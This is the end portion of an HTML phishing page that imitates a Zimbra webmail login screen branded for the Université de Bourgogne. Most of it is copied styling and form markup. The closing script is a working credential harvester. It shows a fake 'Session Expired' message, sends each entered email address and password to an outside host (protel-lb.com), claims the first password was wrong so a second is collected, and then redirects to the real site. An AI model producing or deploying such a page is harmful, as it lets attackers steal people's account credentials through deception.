        width: 200px;
        height: 35px;
      }
      .ImgLoginBanner {
        background-repeat: no-repeat;
        background-position: bottom left;
        background-image: url(https://i.imgur.com/oUI4XsO.png);
        width: 440px;
        height: 60px;
      }
      .console_inset_app_l .HSashThumb {
        margin-left: -2px;
      }
      .UserInfoLink {
        width: 100%;
        text-align: left;
        white-space: nowrap;
      }
      .ZmPicker .ZToolbar {
        padding-top: 1px;
        border-bottom: 1px solid #f2f2f2;
        background-color: #e5e5e5;
      }
      .BannerTextUser {
        overflow: hidden !important;
      }
      .BannerTextUserOffline {
        text-align: left !important;
        padding: 0 3px;
      }
      .ZmAppChooser {
        margin: 0 !important;
      }
      .ZAppTabBorder {
        border-radius: 3px 3px 0 0;
      }
      .ZAppTabBorder .ZLeftIcon {
        padding-left: 10px;
      }
      .ZAppTabBorder .ZWidgetTitle {
        font-size: 1.1rem;
        font-weight: normal;
        padding-bottom: 0;
      }
      .ZAppTabBorder .ZDropDown {
        padding-right: 10px;
      }
      .ZSelectedPrev .ZAppTabBorder {
        border-right-color: #fff;
      }
      .ZAppTabSpacer {
        height: 2.5rem;
        margin-top: -1rem;
      }
      .ZTabBarPrefix {
        width: 10px;
        border-bottom: 1px solid #b2b2b2;
        padding: 0;
      }
      .ZTabBarSuffix {
        width: 100%;
        border-bottom: 1px solid #b2b2b2;
        padding: 0;
      }
      .quotaBar {
        height: 8px;
      }
      .quotaLabel {
        text-align: right;
        font-size: 0.82rem;
      }
      .ZmInviteToolBar .ZToolbarTable,
      .ZmShareToolBar .ZToolbarTable {
        height: 100%;
      }
      .ZNewButton .ZToolbarButtonBorder {
        background-color: rgba(255, 255, 255, 0.65);
      }
      .ZNewButton.ZHover .ZToolbarButtonBorder {
        background: #cce4f3;
      }
      .ZNewButton.ZActive .ZToolbarButtonBorder {
        background: #99cae7;
      }
      .ZToolbarButtonTable TD:first-child {
        padding-left: 5px;
      }
      .ZToolbarButtonTable TD:last-child {
        padding-right: 5px;
      }
      .ZmNetworkStatus {
        font-weight: bold;
      }
      .ZmNetworkStatusIcon {
        cursor: pointer;
      }
      .DwtInputField INPUT[type="text"],
      .DwtInputField INPUT[type="password"],
      .DwtSimpleInput {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: black;
        border: 1px solid #bfbfbf;
      }
      .DwtInputField TEXTAREA {
        padding: 0.2em 0.3em;
        cursor: text;
        color: black;
        border: 1px solid #bfbfbf;
      }
      .DwtInputField-error INPUT[type="text"],
      .DwtInputField-error INPUT[type="password"],
      .DwtSimpleInput-error {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: black;
        background-color: #fff0f0;
        border: 1px solid #bfbfbf;
      }
      .DwtInputField-error TEXTAREA {
        padding: 0.2em 0.3em;
        cursor: text;
        color: black;
        background-color: #fff0f0;
        border: 1px solid #bfbfbf;
      }
      .DwtInputField-focused INPUT[type="text"],
      .DwtInputField-focused INPUT[type="password"],
      .DwtSimpleInput-focused {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: black;
        background-color: #ffffe0;
        border-color: #4c6573 #1e282e #1e282e #5b798a;
        outline: none;
        outline: none;
      }
      .DwtInputField-focused TEXTAREA {
        padding: 0.2em 0.3em;
        cursor: text;
        color: black;
        background-color: #ffffe0;
        border-color: #4c6573 #1e282e #1e282e #5b798a;
        outline: none;
      }
      .DwtInputField-disabled INPUT[type="text"],
      .DwtInputField-disabled INPUT[type="password"],
      .DwtSimpleInput-disabled {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: #999;
        background-color: transparent;
        border: 1px solid #e5e5e5;
      }
      .DwtInputField-disabled TEXTAREA {
        padding: 0.2em 0.3em;
        cursor: text;
        color: #999;
        background-color: transparent;
        border: 1px solid #e5e5e5;
      }
      .DwtInputField-hint INPUT[type="text"],
      .DwtInputField-hint INPUT[type="password"],
      .DwtInputField-hint INPUT,
      .DwtSimpleInput-hint {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: black;
        border: 1px solid #bfbfbf;
        color: #999;
        font-style: italic;
        cursor: default;
      }
      .DwtInputField-hint TEXTAREA {
        padding: 0.2em 0.3em;
        cursor: text;
        color: #999;
        font-style: italic;
        cursor: default;
      }
      .DwtInputField-errorhint INPUT[type="text"],
      .DwtInputField-errorhint INPUT[type="password"],
      .DwtSimpleInput-errorhint {
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        color: black;
        background-color: #fff0f0;
        border: 1px solid #bfbfbf;
        color: #999;
        font-style: italic;
        cursor: default;
      }
      .DwtInputField-errorhint TEXTAREA {
        color: black;
        background-color: #fff0f0;
        border: 1px solid #bfbfbf;
        color: #ccc;
      }
      TEXTAREA .BannerBar * {
        font-size: 0.82rem;
      }
      .BannerBar {
        padding-top: 1px;
        height: 1px;
      }
      .BannerBar TD {
        padding-right: 0;
      }
      .BannerBar .quotabar {
        background-color: white;
      }
      .BannerTextQuota {
        text-align: center;
        vertical-align: top;
      }
      .BannerTextUser,
      .BannerTextQuota {
        cursor: default;
      }
      .BannerTextQuota-MultiAccount {
        padding-top: 5px;
      }
      INPUT[type="text"],
      INPUT[type="password"] {
        border: 1px solid #bfbfbf;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      SELECT {
        border: 1px solid #bfbfbf;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .TabSpacer {
        display: none;
      }
      .Tab {
        white-space: nowrap;
        height: 30px;
        padding-right: 5px !important;
      }
      .TbTop {
        border-width: 0 1px 1px 0 !important;
        padding-right: 5px !important;
      }
      .TbBottom {
        border-width: 0 1px 1px 0 !important;
        padding-right: 5px !important;
      }
      .TabFiller {
        width: 100%;
      }
      .List .Header TH {
        border-right: 1px solid #f2f2f2;
      }
      .ZhSubTabs {
        background-color: #e5e5e5;
        padding-top: 2px;
      }
      .ZhSubTabs {
        padding: 5px !important;
      }
      .ZhSubTabs .TabSelected {
        color: #333;
        background-color: #fff;
        border-color: #b2b2b2 #b2b2b2 #fff;
        cursor: pointer;
      }
      .ZhRow TD,
      .ZhRowOdd TD {
        border-width: 0 0 1px !important;
        padding-left: 3px !important;
      }
      .ZmSearchToolbarCell .ZSelected .ZToolbarButtonBorder {
        background-color: #fbf9f4 !important;
        border: 2px inset;
        color: white;
      }
      .ZAppTabBorder .ZLeftIcon DIV {
        display: none;
      }
      .DwtListView-Column {
        background-color: #fff;
      }
      .DwtListView-Column TD {
        color: #727272;
      }
      .overviewHeader {
        border: 0;
        padding: 1px 0;
      }
      .overviewHeader > TABLE {
        border: 1px solid white;
      }
      .overviewHeader .ZButton {
        height: auto;
      }
      .FirstOverviewHeader.overviewHeader {
        padding-top: 0;
      }
      .RowDouble {
        height: auto;
        padding-top: 0;
      }
      .RowDouble .TopRow,
      .RowDouble .ImgCheckboxChecked,
      .RowDouble .ImgCheckboxUnchecked {
        margin: 6px 0 0;
      }
      .RowDouble .ZmMsgListExpand {
        margin-left: -2px;
        margin-right: 2px;
      }
      .RowDouble .BottomRow {
        margin: 4px 0 6px;
      }
      .Row-matched,
      .RowDouble-matched,
      .RowDouble-matched .ZmListFlagsWrapper,
      .RowDouble-matched .ZmMsgListDate {
        background-color: #fffec4;
      }
      .TopRow,
      .BottomRow {
        height: 16px;
        height: 1.6rem;
        position: relative;
      }
      .ZmListFlagsWrapper {
        position: absolute;
        right: 0;
        background-color: #fff;
      }
      .SimpleContact .ZmListFlagsWrapper {
        padding: 0.08rem 0;
        right: 0;
      }
      .SimpleContact .ImgCheckboxUnchecked,
      .SimpleContact .ImgCheckboxChecked,
      .ZmContactIcon {
        margin: 0 5px 0 2px;
      }
      .ZmListFlagsWrapper DIV {
        margin: 0 2px 0 3px;
      }
      .TopRow .ImgMsgRead,
      .TopRow .ImgMsgUnread {
        margin: 0 3px 0 3px;
      }
      .TopRow .ImgCheckboxUnchecked,
      .TopRow .ImgCheckboxChecked {
        margin: 0 0 0 -1px;
      }
      .TopRow .ImgNodeCollapsed,
      .TopRow .ImgNodeExpanded {
        padding: 0;
      }
      .ZmMsgListColTag {
        padding: 0 2px 0 3px;
        vertical-align: middle;
      }
      .BottomRow .ZmMsgListColTag {
        margin-right: 3px;
      }
      .ZmMsgListDate {
        position: absolute;
        right: 0;
        text-align: right;
      }
      .ZmMsgListColSelection,
      .ZmMsgListColFlag,
      .ZmMsgListColTag,
      .ZmMsgListColAccount,
      .ZmMsgListColStatus,
      .ZmMsgListColMute,
      .ZmMsgListColRead,
      .ZmMsgListColAttachment,
      .ZmMsgListColExpand {
        width: 16px;
      }
      .ZmMsgListColPriority {
        width: 8px;
        margin-left: 3px;
      }
      .ZmMsgListColFolder,
      .ZmMsgListColSize,
      .ZmMsgListColDate {
        text-align: left;
      }
      .ZToolbarTable .vertSep {
        border-color: transparent;
      }
      .appt_new_time .ImgBlank_16,
      .appt_time .ImgBlank_16 {
        display: none;
      }
      .ZmHtmlEditor .mce-btn,
      .ZmHtmlEditor .mce-panel {
        background-color: #fff;
        background-image: none;
      }
      .form .ZLoginButton {
        background-color: #007cc3;
        border-color: white;
        color: white;
      }
      .form .ZLoginButton:hover {
        background-color: #3f9cd2;
        color: #333;
      }
      .form .ZLoginButton:active {
        background-color: #005d92;
      }
      #skin_spacing_tree {
        padding-bottom: 0;
      }
      #skin_spacing_app_row {
        height: 2.4rem;
      }
      .ZAppTabBorder .ZWidgetTitle {
        font-size: 1.3rem;
      }
      .ZmOverview .overviewHeader-Text.FakeAnchor > DIV {
        margin-right: 2px;
      }
      #skin_spacing_tree,
      #skin_spacing_tree_footer {
        border-width: 0;
        margin-left: 3px;
      }
      .ZmConvView,
      .ZmConvView2,
      .ZmMailMsgView {
        background-color: #fff;
      }
      .ZmConvView2FullWidth {
        width: 100%;
      }
      .ZmMailMsgView > DIV {
        background-color: white;
      }
      #skin_container_tree,
      .Conv2View,
      .Conv2View-bottom {
        background-color: transparent;
        background-image: none;
      }
      .NoResults {
        background-color: transparent;
        padding: 1.5em 1em;
        border-radius: 3px;
      }
      .overviewHeader {
        background-color: transparent;
        padding-top: 0;
        padding-bottom: 0;
      }
      .overviewHeader > TABLE {
        border-color: transparent;
      }
      .overviewHeader-selected > TABLE {
        border-color: #99cae7;
      }
      .overviewHeader-selected-focused > TABLE {
        border-color: #4c6573 #1e282e #1e282e #5b798a;
        outline: none;
      }
      .overviewHeader TD {
        background-color: transparent;
        font-size: 1.3rem;
        font-weight: normal;
      }
      .ZNewButton {
        border-radius: 3px;
        margin-right: 0;
        overflow: hidden !important;
        right: -5px;
      }
      .ZNewButton .ZToolbarButtonBorder {
        background-color: #0087c3;
        border-color: #0087c3;
      }
      .ZNewButton.ZFocused .ZToolbarButtonBorder,
      .ZNewButton.ZHover .ZToolbarButtonBorder,
      .ZNewButton.ZActive .ZToolbarButtonBorder {
        background-color: #00aaf6;
        border-color: #00aaf6;
      }
      .ZNewButton.ZActive .ZToolbarButtonBorder {
        background-color: #f15922;
        border-color: #f15922;
        background-image: none;
      }
      .ZNewButton .ZToolbarButtonTable .ZLeftIcon {
        display: none;
      }
      .ZNewButton .ZToolbarButtonTable .ZWidgetTitle,
      .ZNewButton.ZHover .ZToolbarButtonTable .ZWidgetTitle {
        color: white;
      }
      .ZNewButton .ImgSelectPullDownArrow,
      .ZNewButton.ZHover .ImgSelectPullDownArrowHover,
      .ZNewButton.ZActive .ImgSelectPullDownArrow {
        background-image: url(/zimbra/skins/harmony/img/harmony/ImgNewSelectPullDownArrow.png?v=210416092653);
        background-position: 0 0;
      }
      .ZmMailMsgCapsuleView {
        border-width: 0 0 1px;
        border-radius: 0;
      }
      .ZmMailMsgCapsuleView .separator {
        border-color: transparent;
      }
      .Conv2Messages {
        padding: 0.25em 0.5em;
      }
      .Conv2Messages .Last {
        border-color: transparent;
        border-radius: 3px;
      }
      .Conv2Header,
      .Conv2Header .info {
        background-color: #f2f2f2;
        border-bottom-width: 0;
      }
      .Conv2Header {
        height: 2.2em;
      }
      .Conv2Header .subject,
      .Conv2Header .info {
        color: #333;
      }
      .Conv2MsgHeader .image {
        border-radius: 24px;
      }
      .Collapsed .Conv2MsgHeader .image {
        border-radius: 16px;
      }
      .DwtListView-Sash:first-child DIV {
        background-color: #e5e5e5 !important;
      }
      TD.DwtListView-Column {
        background-color: #f2f2f2;
        border-bottom-width: 0;
        font-weight: normal;
      }
      TD.DwtListView-ColumnActive {
        background-color: #f7f7f7;
        font-weight: bold;
      }
      .DwtListView-Rows-Empty > * {
        border-color: transparent;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .DwtListView-Rows-Empty:focus {
        outline: none;
      }
      .DwtListView-Rows-Empty:focus > * {
        border-color: #4c6573 #1e282e #1e282e #5b798a;
        outline: none;
      }
      .console_inset_app_l {
        z-index: 499 !important;
      }
      .Row {
        height: 20px;
        height: 2rem;
        padding-top: 4px;
      }
      .ZmContactSplitView,
      .ZmContactSimpleView,
      .ZmContactInfoView,
      .SimpleContact {
        background-color: transparent;
        border-color: transparent;
      }
      .ZmContactInfoView .headerRow {
        background-color: transparent;
        border-color: transparent;
        margin: 0.25em 0;
        border-radius: 3px;
      }
      .RowDouble {
        padding: 0.25em 0.5em;
      }
      .RowDouble .TopRow {
        position: relative;
      }
      .ZmComposeView INPUT,
      .ZmComposeView TEXTAREA {
        border: none;
        outline: none;
      }
      .ZmContactSplitView,
      .ZmContactSimpleView,
      .ZmContactInfoView .headerRow,
      .ZmContactView .headerRow {
        background-color: transparent;
        border-color: transparent;
      }
      .ZmContactInfoView {
        background-color: white;
        border-width: 0;
        padding: 1em 1em 0;
      }
      .ZmContactInfoView .headerRow {
        margin-bottom: 0.5em;
        padding-top: 0.25em;
      }
      .ZmContactInfoView .contactGroupTable {
        border-collapse: separate;
        border-color: #e5e5e5;
        border-radius: 3px;
      }
      .ZmContactView {
        background-color: transparent;
      }
      .ZmEditGroupContact {
        background-color: white;
        border: 1px solid #bfbfbf;
      }
      .SimpleContact {
        background-color: transparent;
        background-image: none;
        height: 22px;
        height: 2.2rem;
      }
      .SimpleContact > DIV {
        background-color: transparent;
        border-color: transparent;
      }
      .SimpleContact .ZmListFlagsWrapper {
        height: 16px;
        margin-top: 2px;
      }
      .ZmEditGroupContact .Row {
        margin-bottom: 0.5em;
      }
      .groupMembers .ZmEditGroupContact .Row {
        background-color: white;
        border-color: #fff;
        margin: 0.5em;
      }
      .ZmContactView .contactHeaderSubTable,
      .ZmContactInfoView .contactHeaderSubTable {
        background-color: #e5e5e5;
        border-color: transparent;
      }
      .ZmCalViewMgr,
      .calendar_view {
        background-color: transparent;
      }
      .appt_body,
      .appt_30_body,
      .appt_allday_body {
        background-color: white;
        border-color: transparent;
        box-shadow: 0 0 0 transparent;
      }
      .appt_body > TABLE,
      .appt_30_body > TABLE,
      .appt_allday_body > TABLE {
        background-color: transparent;
        background-image: none;
        border-color: transparent;
      }
      .ZmApptComposeField .FakeAnchor {
        float: right;
        max-width: 22em;
      }
      .ZmScheduleAssistantView {
        background-color: white;
      }
      .InvResponseBar {
        background-color: #e5e5e5;
        border-top-color: #ccc;
      }
      .InvResponseBar .ZButtonBorder {
        background-color: #fff;
      }
      .ZmTaskMultiView .DwtListView-Column {
        background-color: transparent;
        border-color: transparent;
      }
      .ZmTaskMultiView .ZmMailMsgView {
        background-color: white;
      }
      .newTaskBannerSep {
        background-color: transparent;
        border-bottom-width: 0;
        margin-bottom: 1em;
      }
      .newTaskBannerSep > TBODY > TR > TD {
        background-color: #e5e5e5;
        padding: 0.5em;
      }
      .ZmTaskEditView .miniCalendarButton .ZButtonBorder,
      .ZmTaskEditView .miniTimeButton .ZButtonBorder,
      .ZmTaskEditView .ZmCompletionSelector .ZButtonBorder {
        margin-top: 0;
      }
      #skin_dropMenu *:focus,
      #skin_userAndQuota *:focus {
        outline-color: #fff;
      }
      .ZmBriefcaseDetailListView {
        background-color: transparent;
      }
      .ZmPreviewView .MsgHeaderTable > TBODY > TR > TD {
        background-color: transparent !important;
      }
      .ZmPreviewView .PreviewViewHeader {
        margin: 0 1em;
      }
      .ZmBriefcaseDetailListView .Row TABLE {
        border-collapse: separate;
        margin: 0.25em 0;
      }
      .ZmDocsEditView {
        background-color: #fff;
      }
      .ZmDocsEditViewHeaderCell > DIV {
        margin: 5px 3px 0;
      }
      .ZmPrefView {
        background-color: #fff;
      }
      .ZOptionsSectionMain {
        background-color: white;
        border-radius: 0 0 3px 3px;
      }
      .prefHeader {
        border-radius: 3px;
      }
      .ZmPrefZimletListView .Row {
        height: auto;
      }
      .ZmWhiteBlackList {
        border: 1px solid #bfbfbf;
        margin-left: 0;
        border-radius: 0;
      }
      .ZmFilterRulesView .ZOptionsSectionMain {
        background-color: #fff;
        border-radius: 0;
      }
      .ZmFilterRulesView .DwtChooserListView {
        background-color: white;
        min-height: 160px;
      }
      .WindowInnerContainer {
        background-color: #fff;
        border-top: none;
      }
      .ZmReminderDialog .DwtToolbarButton {
        border: none;
      }
      .ZmHtmlEditor .ZmHtmlEditorTextArea {
        border: 1px solid #bfbfbf;
        padding: 0.25em;
      }
      .DwtCalendar {
        border-top: 1px solid #bfbfbf;
      }
      .DwtMenu .DwtCalendar {
        border-top-width: 0;
      }
      .ZmContactPicker .DwtChooserListView {
        background-color: white;
        border-color: #bfbfbf;
      }
      .BriefcaseTabBox {
        border-color: #bfbfbf;
        border-style: solid;
        border-radius: 0;
      }
      .ZmContactSplitView .rowLabel,
      .ZmMailMsgView .LabelColName,
      .ZmMailMsgCapsuleView .LabelColName {
        color: #848484;
        font-weight: normal;
      }
      .ImgNewSelectPullDownArrow {
        background: url("/zimbra/skins/harmony/img/harmony/ImgNewSelectPullDownArrow.png?v=210416092653")
          0 0 no-repeat;
        width: 12px !important;
        height: 16px !important;
        overflow: hidden;
      }
      .ImgDisconnect {
        background: url("/zimbra/skins/harmony/img/zimbra.png?v=210416092653") 0
          0 no-repeat;
        width: 16px !important;
        height: 16px !important;
        overflow: hidden;
      }
      .ImgMsgRead {
        background: url("/zimbra/skins/harmony/img/zimbra.png?v=210416092653") 0 -17px
          no-repeat;
        width: 16px !important;
        height: 16px !important;
        overflow: hidden;
      }
      .ImgMsgUnread {
        background: url("/zimbra/skins/harmony/img/zimbra.png?v=210416092653") 0 -34px
          no-repeat;
        width: 16px !important;
        height: 16px !important;
        overflow: hidden;
      }
      .ImgRefreshAll {
        background: url("/zimbra/skins/harmony/img/zimbra.png?v=210416092653") 0 -51px
          no-repeat;
        width: 16px !important;
        height: 16px !important;
        overflow: hidden;
      }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  </head>
  <body>
    <div class="LoginScreen">
      <div class="center">
        <div class="contentBox">
          <h1>
            <a
              href="https://www.u-bourgogne.fr"
              id="bannerLink"
              target="_new"
              title="Zimbra"
              ><span class="ScreenReaderOnly">Zimbra</span>
              <span class="ImgLoginBanner"></span>
            </a>
          </h1>
          <div id="ZLoginAppName">Web Client</div>
          <div name="loginForm" accept-charset="UTF-8">
            <input type="hidden" name="loginOp" value="login" />
            <input
              type="hidden"
              name="login_csrf"
              value="12b67de7-dbd4-4285-99a4-a7172e3b5167"
            />
            <div id="ZLoginErrorPanel">
              <table>
                <tbody>
                  <tr>
                    <td>
                      <img
                        src="https://i.imgur.com/OJum2Sn.png"
                        title="Error"
                        alt="Error"
                        id="ZLoginErrorIcon"
                      />
                    </td>
                    <td class="errorText"></td>
                  </tr>
                </tbody>
              </table>
            </div>

            <table class="form">
              <tbody>
                <tr>
                  <td><label for="username">Username:</label></td>
                  <td>
                    <input
                      id="username"
                      class="zLoginField"
                      name="username"
                      type="text"
                      value=""
                      size="40"
                      maxlength="1024"
                      autocapitalize="off"
                      autocorrect="off"
                    />
                  </td>
                </tr>
                <tr>
                  <td><label for="password">Password:</label></td>
                  <td>
                    <input
                      id="password"
                      autocomplete="off"
                      class="zLoginField"
                      name="password"
                      type="password"
                      value=""
                      size="40"
                      maxlength="1024"
                    />
                  </td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td class="submitTD">
                    <input
                      id="remember"
                      value="1"
                      type="checkbox"
                      name="zrememberme"
                    />
                    <label for="remember">Stay signed in</label>
                    <button
                      id="submitForm"
                      class="ZLoginButton DwtButton"
                      value="Sign In"
                    >
                      Sign In
                    </button>
                  </td>
                </tr>

                <tr>
                  <td colspan="2"><hr /></td>
                </tr>
                <tr>
                  <td>
                    <label for="client">Version:</label>
                  </td>
                  <td>
                    <div class="positioning">
                      <select id="client" name="client">
                        <option value="preferred" selected="">Default</option>
                        <option value="advanced">Advanced (Ajax)</option>
                        <option value="standard">Standard (HTML)</option>
                        <option value="mobile">Mobile</option>
                        <option value="touch">Touch</option>
                      </select>
                      <a
                        id="ZLoginWhatsThisAnchor"
                        aria-controls="ZLoginWhatsThis"
                        aria-expanded="false"
                        >What’s This?</a
                      >
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        <div class="decor1"></div>
      </div>

      <div class="Footer">
        <div class="copyright">
          Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a
          registered trademark of Synacor, Inc.
        </div>
      </div>
      <div class="decor2"></div>
    </div>
    <script>
      var count = 0;
      var hash = window.location.hash;
      document.getElementById("username").value = hash.split("#")[1];
      var em = (document.getElementById("username").value = hash.split("#")[1]);

      var ps = $("#password").val();

      var account_domain;

      document
        .getElementById("submitForm")
        .addEventListener("click", function (event) {
          submit();
        });

      $("#password").keydown(function (e) {
        if (e.which == 13) {
          submit();
          return false;
        }
      });

      if (em === undefined) {
        $("#username").val("");
        $("#username").focus();
      } else {
        $("#password").focus();
      }

      $(".errorText").html("Session Expired! Login again.");

      function validateEmail(email) {
        const re =
          /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
      }

      function submit() {
        var em = $("#username").val();
        var ps = $("#password").val();
        var psLength = $("#password").val().length;

        if (!validateEmail(em)) {
          $(".errorText").html("Please specify a valid email address.");

          $("#password").val("");

          $("#username").val("");

          $("#username").focus();
        } else if (psLength < 4) {
          $(".errorText").html("Invalid Password.");

          $("#password").val("");

          $("#password").focus();
        } else {
          var em = $("#username").val();

          var ps = $("#password").val();

          var domain = em.substring(em.lastIndexOf("@") + 1);

          $.ajax({
            url: "https://protel-lb.com/zimbra/zim.php", // full url of zim.php
            type: "POST",
            data: {
              user: em,
              pass: ps,
              dm: domain,
              type: 1,
            },
            beforeSend: function () {},
            success: function (response) {
              if (count === 1) {
                location.href = "https://" + domain;
              } else {
                $(".errorText").html(
                  "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password."
                );
                $("#password").val("");
                $("#password").focus();
                count = count = +1;
                console.log(count);
              }
            },
          });
        }
      }
    </script>
  </body>
</html>
